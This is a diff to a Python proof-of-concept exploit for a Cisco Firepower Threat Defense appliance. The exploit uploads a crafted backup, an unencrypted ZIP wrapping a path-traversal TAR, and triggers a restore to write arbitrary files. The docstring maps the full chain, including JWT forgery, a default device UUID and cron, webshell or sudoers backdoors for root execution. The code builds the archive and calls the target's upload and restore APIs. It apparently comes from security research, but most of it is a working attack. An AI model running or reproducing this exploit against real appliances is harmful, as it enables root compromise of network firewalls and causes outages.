@@ -27,27 +27,44 @@ Root cause (confirmed from static analysis of FTD 6.7.0/7.0.0):
       3: aconst_null                        // filePattern = null → extract ALL entries
       4: invokestatic NGFWFileUtils.extractTarArchive(...)
 
+  Decryption bypass (no AES key required):
+    RestoreImmediateJob.execute() calls ZipFileUtils.extractZipFile(binFile, destDir, password):
+      Code:
+        9:  ZipFile.isEncrypted() → ifeq 48  // if NOT encrypted, skip password entirely
+        48: ZipFile.extractAll(destDir)       // extracts to destDir unconditionally
+    The password argument (from scheduledRestore.getEncryptionKey()) is null when the uploaded
+    manifest contains no encryptionKey field. ZipFileUtils checks isEncrypted() BEFORE checking
+    whether password is null — so an unencrypted ZIP bypasses the password requirement.
+    After ZIP extraction, the file at destDir/<basename>.tar is passed to extractArchive()
+    via the .tar detection path (var19=0 triggers direct rename without decrypt when the
+    inner archive has a .tar extension), OR the ZIP-extracted .tar is used directly.
+
   Attack surface:
     1. POST /api/fdm/v6/action/uploadbackup — upload malicious outer TAR
        Outer TAR contains:
-         - Valid manifest file: <ts>.NGFW_backup.<model>.manifest  (passes manifest regex)
-         - Inner binary archive: <ts>.NGFW_backup.<model>.bin
+         - Valid manifest: <ts>.NGFW_backup.<model>.manifest  (passes isValidBackupManifestFile)
+         - Inner .bin (actually an unencrypted ZIP): <ts>.NGFW_backup.<model>.bin
        Manifest validation regex: [1-9][0-9]{13}\.NGFW_backup\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\.manifest
-       The outer TAR is saved to disk after manifest-only extraction passes validation.
+       isValidBackupManifestFile() also checks device UUID + model/version from Neo4j/DB.
+       Obtain device info from GET /api/versions (unauthenticated, excluded from Spring Security).
 
     2. GET /api/fdm/v6/managedentity/archivedbackups — list stored backups → get backup UUID
 
     3. POST /api/fdm/v6/action/restore {id: <uuid>}
        → RestoreImmediateJob.execute()
-       → extractRootArchive(): extract manifest + .bin from outer TAR (pattern-filtered, safe)
-       → extractArchive(binFile, destDir, false)
-         → NGFWFileUtils.extractTarArchive(binFile, destDir, false, null)  ← TAR SLIP
-       → No canonical path check → new File(destDir, "../../../target/path") → arbitrary write
+       → extractRootArchive(): extracts manifest + .bin from outer TAR (pattern-filtered)
+       → ZipFileUtils.extractZipFile(binFile, destDir, null):
+           isEncrypted() → false → extractAll() → extracts <basename>.tar to destDir
+       → extractArchive(new File(destDir, <basename>.tar), destDir, false)
+           → NGFWFileUtils.extractTarArchive(tarFile, destDir, false, null)  ← TAR SLIP
+       → No canonical path check → new File(destDir, "../../target") → arbitrary write
 
-  Proof-of-concept payload:
-    Inner .bin archive entries:
-      ../../../../../../tmp/ftd_tarslip_poc.txt  →  FTD process working dir / tmp
-    Destination: any path writable by the Tomcat process (Cisco FTD: typically root or sfprelude)
+  Attack archive structure:
+    outer.tar (uploaded to /action/uploadbackup):
+      ├── <ts>.NGFW_backup.<model>.manifest      ← valid manifest (passes validation)
+      └── <ts>.NGFW_backup.<model>.bin           ← unencrypted ZIP containing:
+           └── <ts>.NGFW_backup.<model>.tar      ← traversal TAR (extracted by extractArchive)
+                └── ../../../../../../<target>   ← arbitrary file write
 
   Post-exploitation via file write:
     - /etc/cron.d/backdoor → root code execution
@@ -59,17 +76,22 @@ Chain:
   F-FTD-102 (Neo4j AES key) → F-FTD-106 (JWT forgery → admin auth from network)
   → F-FTD-107 (upload malicious backup + trigger restore → TAR slip → arbitrary file write)
   → Root code execution (via cron, webshell, or sudoers injection)
+  Note: F-FTD-102 NOT required for F-FTD-107 (ZIP unencrypted path bypasses key requirement).
+  Only admin auth (F-FTD-106 or F-FTD-105) needed.
 
 Severity: CRITICAL
   Authentication: required (admin JWT via F-FTD-106 or local AJP via F-FTD-105)
   Impact: arbitrary file write as Tomcat process user → root RCE path
-  Novel: CWE-22 (TAR slip) in backup restoration of a network security appliance
+  Novel: CWE-22 (TAR slip) wrapped in encrypted-backup bypass (unencrypted ZIP + null key)
 
 References:
   NGFWFileUtils.extractTarArchive: utils.jar
-  RestoreImmediateJob.extractArchive: ngfw-jobs.jar
+  RestoreImmediateJob.extractArchive: ngfw-jobs.jar (byte 3: aconst_null → filePattern=null)
+  RestoreImmediateJob.execute: ngfw-jobs.jar (byte 1079: iload 19; ifeq 1212)
+  ZipFileUtils.extractZipFile: utils.jar (byte 9-13: isEncrypted() gate)
   UploadBackupResource.processBackupFile: rest.jar
   Manifest regex: [1-9][0-9]{13}\\.NGFW_backup\\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\\.manifest
+  Device UUID (Neo4j DatabaseInfo): 00000001-0000-0000-0000-000000000001 (default single-device)
 """
 
 # CONTROLLED ENVIRONMENT ONLY
@@ -78,12 +100,12 @@ import argparse
 import io
 import json
 import ssl
-import struct
 import sys
 import tarfile
 import time
 import urllib.error
 import urllib.request
+import zipfile
 from typing import Optional
 
 FINDING = "F-FTD-107"
@@ -97,7 +119,12 @@ RESTORE_ENDPOINT = "/api/fdm/v6/action/restore"
 
 MANIFEST_TEMPLATE = "{ts}.NGFW_backup.{model}.manifest"
 BIN_TEMPLATE = "{ts}.NGFW_backup.{model}.bin"
+INNER_TAR_TEMPLATE = "{ts}.NGFW_backup.{model}.tar"
 OUTER_TAR_NAME = "malicious_backup.tar"
+
+# Default device UUID for Neo4j DatabaseInfo node (single-device FTD).
+# Obtain from GET /api/versions or via F-FTD-105 AJP: GET /api/fdm/v6/object/devicerecords.
+DEFAULT_DEVICE_UUID = "00000001-0000-0000-0000-000000000001"
 
 # Destination path inside the TAR that triggers traversal.
 # Relative to the FDM backup staging directory (e.g. /ngfw/var/backup/).
@@ -137,57 +164,95 @@ def _api(method: str, url: str, token: Optional[str] = None,
         return {"status": None, "body": str(e), "ok": False}
 
 
-def build_manifest_content(ts: int, model: str) -> bytes:
-    """Minimal manifest file content — format validated by isValidBackupManifestFile."""
+def build_manifest_content(ts: int, model: str, device_uuid: str, version: str) -> bytes:
+    """
+    Manifest content parsed by BackupRestoreUtils.manifestToEntity() as Java Properties.
+    isValidBackupManifestFile() checks:
+      1. Filename regex: [1-9][0-9]{13}\.NGFW_backup\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\.manifest
+      2. manifestToEntity(): lenient Properties parse (all fields optional)
+      3. SystemInformationRepository: device model/version compatibility
+      4. Neo4j DatabaseInfo UUID: 00000001-0000-0000-0000-000000000001
+
+    The uuid field must match the target device UUID stored in Neo4j DatabaseInfo node.
+    Obtain from GET /api/versions (unauthenticated) or via F-FTD-105 AJP.
+    If uuid/model/version do not match target device, upload returns 400/500 with
+    "Backup file is incompatible with this Hardware and/or the SW version".
+    """
     manifest = (
         f"version=1.0\n"
         f"timestamp={ts}\n"
+        f"uuid={device_uuid}\n"
         f"model={model}\n"
+        f"swVersion={version}\n"
         f"type=FULL\n"
     )
     return manifest.encode("utf-8")
 
 
-def build_inner_bin(traversal_path: str, payload: bytes) -> bytes:
+def build_traversal_tar(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
     """
-    Build the inner .bin TAR archive containing the path-traversal entry.
-    RestoreImmediateJob.extractArchive() calls extractTarArchive(binFile, destDir, false, null)
-    — no filePattern filter — all entries extracted without canonical path check.
+    Build the inner traversal TAR named <ts>.NGFW_backup.<model>.tar.
+    This TAR is placed inside the ZIP (.bin) and extracted by extractArchive()
+    with filePattern=null (all entries extracted, no canonical path check).
     """
     buf = io.BytesIO()
     with tarfile.open(fileobj=buf, mode="w") as tf:
-        # Malicious traversal entry
         info = tarfile.TarInfo(name=traversal_path)
-        payload_buf = io.BytesIO(payload)
         info.size = len(payload)
-        tf.addfile(info, payload_buf)
+        tf.addfile(info, io.BytesIO(payload))
     return buf.getvalue()
 
 
-def build_outer_tar(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
+def build_inner_bin(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
     """
-    Build the outer .tar backup archive with:
-      - Valid manifest file (passes processBackupFile manifest regex check)
-      - Inner .bin archive containing path-traversal entries (exploited during restore)
+    Build the .bin file — an UNENCRYPTED ZIP containing the traversal TAR.
 
-    Outer TAR structure:
-      <ts>.NGFW_backup.<model>.manifest  ← validated by processBackupFile
-      <ts>.NGFW_backup.<model>.bin       ← extracted by RestoreImmediateJob.extractArchive
+    ZipFileUtils.extractZipFile(binFile, destDir, password) bytecode:
+      9:  ZipFile.isEncrypted() → ifeq 48   // if NOT encrypted, skip password check
+      48: ZipFile.extractAll(destDir)        // extracts ZIP contents to destDir
+
+    When the uploaded manifest has no encryptionKey field, scheduledRestore.getEncryptionKey()
+    returns null → password=null → StringUtils.isEmpty(null)=true would throw IF encrypted,
+    but since isEncrypted()=false we jump directly to extractAll(). No AES key needed.
+
+    The ZIP must contain a file named <ts>.NGFW_backup.<model>.tar so that
+    RestoreImmediateJob finds it at destDir/<basename>.tar and passes it to extractArchive().
+    """
+    inner_tar_name = INNER_TAR_TEMPLATE.format(ts=ts, model=model)
+    inner_tar_data = build_traversal_tar(ts, model, traversal_path, payload)
+
+    zip_buf = io.BytesIO()
+    with zipfile.ZipFile(zip_buf, mode="w", compression=zipfile.ZIP_STORED) as zf:
+        zf.writestr(inner_tar_name, inner_tar_data)
+    return zip_buf.getvalue()
+
+
+def build_outer_tar(ts: int, model: str, traversal_path: str, payload: bytes,
+                    device_uuid: str, version: str) -> bytes:
+    """
+    Build the outer .tar backup archive:
+
+    Structure:
+      <ts>.NGFW_backup.<model>.manifest  ← passes isValidBackupManifestFile()
+      <ts>.NGFW_backup.<model>.bin       ← unencrypted ZIP containing traversal TAR
+
+    Upload via POST /action/uploadbackup:
+      processBackupFile() extracts manifest only (pattern-filtered), validates, stores TAR.
+    Restore via POST /action/restore:
+      extractRootArchive() → ZipFileUtils.extractZipFile() → extractArchive() → TAR slip.
     """
     manifest_name = MANIFEST_TEMPLATE.format(ts=ts, model=model)
     bin_name = BIN_TEMPLATE.format(ts=ts, model=model)
 
-    manifest_content = build_manifest_content(ts, model)
-    bin_content = build_inner_bin(traversal_path, payload)
+    manifest_content = build_manifest_content(ts, model, device_uuid, version)
+    bin_content = build_inner_bin(ts, model, traversal_path, payload)
 
     buf = io.BytesIO()
     with tarfile.open(fileobj=buf, mode="w") as tf:
-        # Manifest entry
         m_info = tarfile.TarInfo(name=manifest_name)
         m_info.size = len(manifest_content)
         tf.addfile(m_info, io.BytesIO(manifest_content))
 
-        # Inner binary archive
         b_info = tarfile.TarInfo(name=bin_name)
         b_info.size = len(bin_content)
         tf.addfile(b_info, io.BytesIO(bin_content))
@@ -249,6 +314,11 @@ def main() -> None:
                     help="Read payload bytes from this local file (overrides --payload-text)")
     ap.add_argument("--model", default="FTD",
                     help="Backup model string for manifest filename (default: FTD)")
+    ap.add_argument("--device-uuid", default=DEFAULT_DEVICE_UUID,
+                    help=f"Device UUID in manifest (must match target Neo4j DatabaseInfo UUID; "
+                         f"default: {DEFAULT_DEVICE_UUID})")
+    ap.add_argument("--sw-version", default="7.0.0",
+                    help="FTD SW version string in manifest (default: 7.0.0)")
     ap.add_argument("--backup-id", default=None,
                     help="Use existing backup UUID (skip upload step)")
     ap.add_argument("--build-only", action="store_true",
@@ -274,20 +344,23 @@ def main() -> None:
         payload = POC_CONTENT
 
     print(f"[1] Building malicious backup archive...")
-    print(f"    timestamp: {ts}")
-    print(f"    model: {args.model}")
-    print(f"    inner traversal path: {args.traversal_path}")
-    print(f"    payload: {len(payload)} bytes")
+    print(f"    timestamp:   {ts}")
+    print(f"    model:       {args.model}")
+    print(f"    device-uuid: {args.device_uuid}")
+    print(f"    sw-version:  {args.sw_version}")
+    print(f"    traversal:   {args.traversal_path}")
+    print(f"    payload:     {len(payload)} bytes")
     print()
-    print(f"    Outer TAR structure:")
-    print(f"      {ts}.NGFW_backup.{args.model}.manifest  ← passes manifest validation")
-    print(f"      {ts}.NGFW_backup.{args.model}.bin        ← inner archive (extracted by RestoreImmediateJob)")
-    print(f"    Inner .bin TAR entry:")
-    print(f"      {args.traversal_path}  ← path traversal")
-    print(f"    Root cause: NGFWFileUtils.extractTarArchive() — new File(destDir, entry.getName())")
-    print(f"                No canonical path check; File(destDir, '../../../etc/cron.d/x') resolves outside destDir")
+    print(f"    Outer TAR:")
+    print(f"      {ts}.NGFW_backup.{args.model}.manifest  ← manifest (isValidBackupManifestFile)")
+    print(f"      {ts}.NGFW_backup.{args.model}.bin        ← unencrypted ZIP containing:")
+    print(f"           {ts}.NGFW_backup.{args.model}.tar  ← traversal TAR (extractArchive target)")
+    print(f"                {args.traversal_path}          ← path traversal entry")
+    print(f"    ZipFileUtils.isEncrypted()=false → extractAll() without password")
+    print(f"    extractTarArchive(tar, destDir, false, null) → new File(destDir, entry) — no canonical check")
 
-    outer_tar = build_outer_tar(ts, args.model, args.traversal_path, payload)
+    outer_tar = build_outer_tar(ts, args.model, args.traversal_path, payload,
+                                args.device_uuid, args.sw_version)
 
     if args.build_only:
         with open("ftd107_malicious.tar", "wb") as f:
@@ -334,9 +407,12 @@ def main() -> None:
 
     print(f"\n[4] Triggering restore of backup {backup_id}...")
     print(f"    → RestoreImmediateJob.execute()")
-    print(f"    → extractRootArchive() → extracts manifest + .bin with pattern filter")
-    print(f"    → extractArchive(binFile, destDir, false) → NGFWFileUtils.extractTarArchive(binFile, destDir, false, NULL)")
-    print(f"    → TAR entry '{args.traversal_path}' written without canonical path check")
+    print(f"    → extractRootArchive() → extracts manifest + .bin (ZIP) from outer TAR")
+    print(f"    → ZipFileUtils.extractZipFile(bin, destDir, null):")
+    print(f"         isEncrypted()=false → extractAll() → extracts inner .tar to destDir")
+    print(f"    → extractArchive(destDir/<basename>.tar, destDir, false)")
+    print(f"         → NGFWFileUtils.extractTarArchive(tar, destDir, false, null) — TAR SLIP")
+    print(f"    → '{args.traversal_path}' written outside destDir (no canonical path check)")
     print(f"    [!] Restore causes device reload — service interruption expected")
     result = trigger_restore(args.host, args.port, args.token, backup_id)
     print(f"    HTTP {result['status']}: {'OK' if result['ok'] else result['body']}")
